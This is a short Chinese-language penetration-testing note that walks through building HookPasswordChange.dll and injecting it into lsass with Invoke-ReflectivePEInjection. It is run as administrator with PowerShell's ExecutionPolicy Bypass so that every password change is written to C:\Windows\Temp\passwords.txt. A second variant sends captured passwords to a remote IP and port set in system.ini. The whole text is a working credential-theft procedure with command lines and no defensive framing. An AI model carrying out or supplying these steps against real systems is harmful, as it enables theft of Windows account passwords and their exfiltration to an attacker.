	使用VS2015开发环境，MFC设置为在静态库中使用MFC
	编译工程，生成HookPasswordChange.dll
	https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1
	在代码尾部添加如下代码：
	>Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass
	并命名为HookPasswordChangeNotify.ps1
	上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll
	管理员权限执行
	>PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
	C:\Windows\Temp下可以找到passwords.txt
	&
	https://gitee.com/RichChigga/PasswordchangeNotify
	上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll 管理员权限执行：
	>PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
	在C:\Windows\System32 新建文件system.ini第一行是连接的ip 第二行是端口
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/520.png)